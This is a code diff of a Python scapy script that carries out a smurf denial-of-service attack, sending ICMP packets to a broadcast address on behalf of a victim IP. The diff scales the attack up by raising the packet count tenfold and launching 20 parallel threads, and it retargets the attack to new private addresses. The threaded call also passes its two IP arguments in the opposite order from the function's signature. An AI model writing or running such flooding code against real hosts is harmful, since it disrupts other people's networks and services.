@@ -1,9 +1,11 @@
+import threading
 import time
 from scapy.layers.inet import IP, ICMP
 from scapy.sendrecv import send
 
-PACKETS_COUNTER = 100
+PACKETS_COUNTER = 1000
 DELAY = 0.01
+THREADS = 20
 
 
 def smurf_attack(victim_ip, broadcast_ip):
@@ -19,7 +21,18 @@ def smurf_attack(victim_ip, broadcast_ip):
     print(f"Отправлено {PACKETS_COUNTER} пакетов.")
 
 
-broadcast_ip = "172.20.10.255"
-victim_ip = "172.20.10.3"
+def thread_smurf_attack(broadcast_ip, victim_ip):
+    threads = []
 
-smurf_attack(victim_ip, broadcast_ip)
+    for i in range(THREADS):
+        t = threading.Thread(target=smurf_attack, args=(broadcast_ip, victim_ip))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+broadcast_ip = "192.168.214.255"
+victim_ip = "192.168.214.154"
+
+thread_smurf_attack(broadcast_ip, victim_ip)
